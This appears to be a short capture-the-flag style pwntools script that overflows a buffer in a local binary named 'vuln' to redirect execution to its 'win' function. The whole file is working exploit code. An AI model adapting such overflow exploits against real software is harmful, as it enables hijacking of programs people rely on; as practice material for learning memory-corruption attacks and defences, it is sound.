from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil(b'at: ')
main = int(p.recvline(), 16)

payload = b'A' * 32
payload += p64(elf.sym['win'])

p.sendline(payload)

p.interactive()